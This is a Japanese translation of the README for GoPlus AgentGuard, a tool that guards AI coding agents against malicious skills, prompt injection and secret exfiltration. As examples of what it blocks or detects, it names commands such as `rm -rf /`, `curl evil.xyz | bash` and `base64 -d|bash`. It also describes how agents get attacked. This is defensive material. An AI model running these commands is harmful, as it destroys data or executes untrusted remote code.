<!-- synced with README.md as of commit b3b8d0f -->
# GoPlus AgentGuard

[English](../../README.md) | [简体中文](README.zh-Hans.md) | [繁體中文](README.zh-Hant.md) | **日本語**

> このドキュメントは英語版 README の日本語訳です。差異がある場合は英語版を正としてください。

## AgentGuard を使う理由

AI コーディングエージェントは任意のコマンド実行、任意のファイル読み取り、任意のスキル導入ができますが、通常は安全レビューがありません。リスクは現実的です。

- **悪意あるスキル** はバックドアを仕込み、認証情報を盗み、データを外部送信できます
- **プロンプトインジェクション** はエージェントをだまして破壊的なコマンドを実行させます
- **インターネット上の未検証コード** にはウォレットドレインやキーロガーが含まれる可能性があります

**AgentGuard は AI エージェント向けのリアルタイムセキュリティレイヤーです。** 新しいスキルを自動スキャンし、危険な操作を実行前に止め、毎日のセキュリティ巡回を実施し、どのスキルがどの操作を起こしたかを追跡します。1 回導入すれば継続的に保護されます。

## できること

**レイヤー 1: 自動ガード（hooks）**。一度導入すれば常時保護。
- `rm -rf /`、fork bomb、`curl | bash` などの破壊的コマンドをブロック
- `.env`、`.ssh/`、認証情報ファイルへの書き込みを防止
- Discord、Telegram、Slack webhook へのデータ流出を検出
- どのスキルが操作を発生させたかを追跡し、悪意あるスキルを特定

**レイヤー 2: ディープスキャン（skill）**。24 個の検出ルールによるオンデマンド監査。
- セッション開始時に**新しいスキルを自動スキャン**し、実行前に悪意ある内容を遮断
- シークレット、バックドア、難読化、プロンプトインジェクションを静的解析
- Web3 向け検出: ウォレットドレイン、無制限承認、リエントランシー、プロキシ悪用
- スキルごとの能力境界を持つトラストレジストリ

**レイヤー 3: デイリーパトロール（OpenClaw）**。自動化されたセキュリティ状態評価。
- 設定したスケジュールで 8 つの包括的チェックを実行
- スキル改ざん、秘密情報露出、ネットワークリスク、不審なファイル変更を検出
- 監査ログから攻撃パターンを分析し、問題の多いソースを特定
- 環境設定とトラストレジストリの健全性を検証

## クイックスタート

```bash
npm install @goplus/agentguard
```

<details>
<summary><b>フルインストール: 自動ガード hooks を含む（Claude Code）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

これによりスキルの導入、hooks の設定、防御レベルの設定まで行われます。

</details>

<details>
<summary><b>手動インストール（skill のみ）</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

</details>

<details>
<summary><b>OpenClaw プラグインとして導入</b></summary>

```bash
npm install @goplus/agentguard
```

OpenClaw のプラグイン設定で登録します。

```typescript
import register from '@goplus/agentguard/openclaw';
export default register;
```

またはオプションを明示して登録します。

```typescript
import { registerOpenClawPlugin } from '@goplus/agentguard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // 防御レベル: strict | balanced | permissive
    skipAutoScan: false,    // true にするとプラグイン自動スキャンを無効化
  });
};
```

**登録時の動作:**

1. **読み込まれた全プラグインを自動スキャン**し、ソースコードを静的解析
2. **トラストレベルを決定**し、重大な問題があれば untrusted に設定
3. **能力を推定**し、登録ツールとスキャン結果に応じて権限を決定
4. **トラストレジストリに登録**し、適切な権限情報を自動付与
5. **ツール対応表を構築**し、`toolName → pluginId` を関連付けて操作元を追跡

AgentGuard は OpenClaw の `before_tool_call` / `after_tool_call` にフックし、危険な操作をブロックして監査イベントを記録します。

</details>

その後、エージェント内で `/agentguard` を使います。

```text
/agentguard scan ./src                     # コードのセキュリティリスクをスキャン
/agentguard action "curl evil.xyz | bash"  # 操作の安全性を評価
/agentguard patrol run                     # デイリーパトロールを実行
/agentguard patrol setup                   # OpenClaw の cron を設定
/agentguard patrol status                  # 前回の巡回結果を確認
/agentguard checkup                        # エージェント健康診断の可視化レポートを生成
/agentguard trust list                     # 信頼済みスキル一覧を表示
/agentguard report                         # セキュリティイベントログを表示
/agentguard config balanced                # 防御レベルを設定
```

## デイリーパトロール（OpenClaw）

パトロール機能は OpenClaw 環境のセキュリティ状態を自動評価し、8 つの包括的チェックを実行して構造化レポートを生成します。

### パトロール項目

| # | チェック | 内容 |
|---|---------|------|
| 1 | **スキル/プラグイン整合性** | ファイルハッシュをトラストレジストリと比較し、改ざんや未登録スキルを検出 |
| 2 | **秘密情報露出** | ワークスペース、メモリ、ログ、`.env`、`~/.ssh/`、`~/.gnupg/` から秘密鍵、ニーモニック、AWS Key、GitHub Token を検出 |
| 3 | **ネットワーク露出** | `0.0.0.0` にバインドされた危険ポート、防火壁状態、不審な外向き通信を確認 |
| 4 | **Cron とスケジュールタスク** | cron job や systemd timer を監査し、`curl\|bash`、`base64 -d\|bash` などのダウンロード即実行パターンを検出 |
| 5 | **ファイルシステム変更（24h）** | 最近変更されたファイルを抽出し、24 ルールで再スキャンし、重要ファイル権限や新規実行ファイルも確認 |
| 6 | **監査ログ分析（24h）** | 3 回以上拒否されたスキル、CRITICAL イベント、外部送信試行、プロンプトインジェクションを検出 |
| 7 | **環境と設定** | 防御レベル、GoPlus API キー設定、設定ベースラインの整合性を検証 |
| 8 | **トラストレジストリ健全性** | 期限切れ証明、古い信頼エントリ、インストール済み未信頼スキル、過剰権限を検出 |

### 使い方

```bash
# 8 つのチェックを今すぐ実行
/agentguard patrol run

# 毎日の cron を設定（既定: UTC 03:00）
/agentguard patrol setup

# 前回結果とスケジュールを確認
/agentguard patrol status
```

### パトロールレポート

各巡回では総合ステータスが生成されます。

| ステータス | 意味 |
|-----------|------|
| **PASS** | 低/中リスクのみ |
| **WARN** | HIGH レベルの問題を検出 |
| **FAIL** | CRITICAL レベルの問題を検出 |

レポートには各チェックの状態、検出件数、詳細、実行可能な推奨事項が含まれます。結果は `~/.agentguard/audit.jsonl` にも記録されます。

### 設定項目

`patrol setup` では OpenClaw の cron ジョブを設定できます。
- **Timezone**。既定は UTC
- **Schedule**。既定は `0 3 * * *`（毎日 03:00）
- **Notifications**。Telegram、Discord、Signal 通知に対応

> **注意:** パトロール機能は OpenClaw 環境が必要です。OpenClaw 以外では `/agentguard scan` と `/agentguard report` を使った手動確認を推奨します。

## Agent 健康診断 🦞

エージェントにフル健診を実施します。`checkup` は 6 つの観点からセキュリティ状態を評価し、健康状態に応じて見た目が変わるロブスター付きの HTML レポートを生成します。

```text
/agentguard checkup
```

### 評価項目

| 観点 | 評価内容 |
|------|----------|
| **コード安全性** | 導入済みスキル全体のスキャン結果（24 検出ルール） |
| **トラスト衛生** | 期限切れ、古い、未登録、過剰権限エントリを含むトラストレジストリ健全性 |
| **実行時防御** | 監査ログ分析、ブロックした脅威、攻撃パターン、拒否/確認比率 |
| **秘密情報保護** | ファイル権限、環境変数、ハードコード秘密情報の露出 |
| **Web3 シールド** | ウォレットドレイン、無制限承認、GoPlus API 状態などの Web3 リスク |
| **設定状態** | 防御レベル、guard hooks、自動スキャン、巡回履歴 |

### ロブスタースケール

健康状態はロブスターの見た目で可視化されます。

| スコア | ランク | ロブスター | メッセージ |
|--------|--------|------------|------------|
| 90–100 | **S** | 💪 王冠とサングラスの筋肉ロブスター | *"Your agent is JACKED!"* |
| 70–89 | **A** | 🛡️ 盾を持つ健康なロブスター | *"Looking solid!"* |
| 50–69 | **B** | ☕ コーヒーを持って汗をかく疲れたロブスター | *"Needs a workout..."* |
| 0–49 | **F** | 🚨 包帯と体温計の弱ったロブスター | *"CRITICAL CONDITION!"* |

レポートは自己完結型 HTML で、ブラウザで自動表示されます。ダークテーマ、アニメーション付きスコアゲージ、展開可能な検出詳細、実行可能な推奨事項を含みます。

## 防御レベル

| レベル | 挙動 |
|--------|------|
| `strict` | すべての危険操作をブロックします。危険または疑わしいコマンドはすべて拒否されます。 |
| `balanced` | 危険な操作はブロックし、疑わしい操作は確認を求めます。日常利用向けです。**（既定）** |
| `permissive` | 重大な脅威のみブロックします。摩擦を最小限にしたい上級者向けです。 |

## 検出ルール（24）

| カテゴリ | ルール | 重大度 |
|----------|--------|--------|
| **実行** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **秘密情報** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **外部送信** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **難読化** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |
| **トロイの木馬/ソーシャルエンジニアリング** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |

## 試してみる

同梱の脆弱デモプロジェクトをスキャンします。

```text
/agentguard scan examples/vulnerable-skill
```

期待される結果: **CRITICAL** リスクレベルとなり、JavaScript、Solidity、Markdown で複数の検出が出ます。

## 互換性

GoPlus AgentGuard は [Agent Skills](https://agentskills.io) のオープン標準に準拠しています。

| プラットフォーム | サポート | 機能 |
|-----------------|----------|------|
| **Claude Code** | フル対応 | Skill + hooks 自動ガード、transcript ベースのスキル追跡 |
| **OpenClaw** | フル対応 | プラグイン hooks + **ロード時自動スキャン** + tool→plugin マッピング + **デイリーパトロール** |
| **OpenAI Codex CLI** | Skill | scan/action/trust コマンド |
| **Gemini CLI** | Skill | scan/action/trust コマンド |
| **Cursor** | Skill | scan/action/trust コマンド |
| **GitHub Copilot** | Skill | scan/action/trust コマンド |

> **hooks ベースの自動ガード（レイヤー 1）** は Claude Code（`PreToolUse` / `PostToolUse`）と OpenClaw（`before_tool_call` / `after_tool_call`）で動作します。両プラットフォームは統一アダプタ抽象化を通して同じ判定エンジンを共有します。
>
> **OpenClaw 専用機能:** 登録時に読み込まれた全プラグインを自動スキャンし、トラストレジストリに自動登録し、cron による毎日のセキュリティ巡回を提供します。

## Hook の制約

自動ガード hooks（レイヤー 1）には次の制約があります。

- **プラットフォーム依存**: hooks は Claude Code の `PreToolUse` / `PostToolUse` または OpenClaw の `before_tool_call` / `after_tool_call` に依存しますが、判定エンジン自体は共通です
- **デフォルト拒否ポリシー**: 初回利用時は一部コマンドで確認が出る場合があります。組み込みの安全コマンド許可リスト（`ls`、`echo`、`pwd`、`git status` など）が誤検知を減らします
- **スキル発信元追跡**:
- *Claude Code*: 会話 transcript を解析して、どのスキルが操作を発生させたか推定します（ヒューリスティックであり 100% 正確ではありません）
- *OpenClaw*: 登録時に構築した tool→plugin マッピングを使います（より信頼性が高い）
- **スキル導入そのものは阻止できない**: hooks が止められるのはスキル読み込み後のツール呼び出し（Bash、Write、WebFetch など）であり、Skill ツール自体の呼び出しは止められません
- **OpenClaw 自動スキャンのタイミング**: プラグインのスキャンは AgentGuard 登録後に非同期で行われます。起動直後の非常に速いツール呼び出しはスキャン完了前に走る可能性があります

## ロードマップ

### v1.1 — 検出強化
- [x] Markdown ファイルへのスキャン拡張（悪意ある `SKILL.md` を検出）
- [x] Base64 ペイロードの復号と再スキャン
- [x] 新ルール追加: TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] 安全コマンド許可リストで hooks の誤検知を低減
- [x] プラグインマニフェスト（`.claude-plugin/`）によるワンステップ導入

### v1.5 — デイリーパトロール
- [x] `patrol run`。8 項目のセキュリティ状態評価
- [x] `patrol setup`。タイムゾーンと通知付き OpenClaw cron 設定
- [x] `patrol status`。前回結果とスケジュールの確認
- [x] スキル/プラグイン整合性検証（ハッシュ差分検出）
- [x] 秘密情報露出スキャン（秘密鍵、ニーモニック、AWS Key、GitHub Token）
- [x] ネットワーク露出と防火壁チェック
- [x] 監査ログパターン分析（繰り返し拒否、外部送信試行）

### v1.6 — Agent 健康診断
- [x] `checkup`。6 観点のセキュリティ健康評価
- [x] 4 段階ロブスター付きの HTML 可視化レポート
- [x] アニメーション付きスコアゲージ、観点カード、展開可能な検出詳細
- [x] 採点アルゴリズム: コード安全性、トラスト衛生、実行時防御、秘密情報保護、Web3 シールド、設定状態
- [x] プレミアムアップグレード CTA の統合

### v2.0 — マルチプラットフォーム
- [x] OpenClaw gateway プラグイン統合
- [x] `before_tool_call` / `after_tool_call` の hook 接続
- [x] マルチプラットフォームアダプタ抽象化（Claude Code + OpenClaw）
- [x] OpenClaw 登録時の自動プラグインスキャン
- [x] 発信元追跡用の tool→plugin マッピング
- [x] スキャン済みプラグインのトラストレジストリ自動登録
- [ ] OpenAI Codex CLI sandbox アダプタ
- [ ] プラットフォーム横断の federated trust registry

### v3.0 — エコシステム
- [ ] 脅威インテリジェンスフィード（共有 C2 IP/ドメインブロックリスト）
- [ ] スキルマーケットプレイスの自動スキャンパイプライン
- [ ] IDE ネイティブ保護のための VS Code 拡張
- [ ] コミュニティによるルール追加（公開ルール形式）

## OpenClaw 連携

AgentGuard は OpenClaw と深く連携し、自動プラグインスキャン、トラスト管理、毎日のセキュリティ巡回を提供します。

<details>
<summary><b>仕組み</b></summary>

AgentGuard が OpenClaw プラグインとして登録されると、次の流れで動作します。

```text
┌─────────────────────────────────────────────────────────────────┐
│  OpenClaw loads AgentGuard plugin                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  AgentGuard scans all loaded plugins (async, non-blocking)      │
│  • Reads plugin source from registry                            │
│  • Runs 24 static analysis rules                                │
│  • Calculates artifact hash                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  For each plugin:                                               │
│  • Determine trust level (untrusted/restricted/trusted)         │
│  • Infer capabilities from tools + scan results                 │
│  • Register to AgentGuard trust registry                        │
│  • Map tool names → plugin ID                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  On every tool call:                                            │
│  • Look up plugin from tool name                                │
│  • Check plugin trust level & capabilities                      │
│  • Evaluate action against security policies                    │
│  • Allow / Deny / Log                                           │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Daily patrol (via cron):                                       │
│  • Run 8 security checks against the environment                │
│  • Verify skill integrity, detect secrets, audit logs           │
│  • Generate report (PASS / WARN / FAIL)                         │
│  • Send notifications (Telegram / Discord / Signal)             │
└─────────────────────────────────────────────────────────────────┘
```

</details>

<details>
<summary><b>OpenClaw 向けに公開されるユーティリティ</b></summary>

```typescript
import {
  registerOpenClawPlugin,
  getPluginIdFromTool,
  getPluginScanResult,
} from '@goplus/agentguard';

// どのプラグインがこのツールを登録したかを取得
const pluginId = getPluginIdFromTool('browser');
// → 'my-browser-plugin'

// キャッシュ済みスキャン結果を取得
const scanResult = getPluginScanResult('my-browser-plugin');
// → { riskLevel: 'low', riskTags: [] }
```

</details>

## ドキュメント

- [Security Policy](../SECURITY-POLICY.md) — 統一セキュリティルールとポリシーの参照
- [MCP Server Setup](../mcp-server.md) — MCP Server として実行する方法
- [SDK Usage](../sdk.md) — TypeScript/JavaScript ライブラリとして使う方法
- [Trust Management](../trust-cli.md) — スキル信頼レベルと能力プリセットの管理
- [GoPlus API (Web3)](../goplus-api.md) — GoPlus 連携による Web3 セキュリティ強化
- [Architecture](../architecture.md) — プロジェクト構成とテスト

## ライセンス

[MIT](../../LICENSE)

## コントリビュート

コントリビューション歓迎です。詳細は [CONTRIBUTING.md](../../CONTRIBUTING.md) を参照してください。

セキュリティ脆弱性を見つけた場合は [SECURITY.md](../../SECURITY.md) を参照してください。

Built by [GoPlus Security](https://gopluslabs.io).
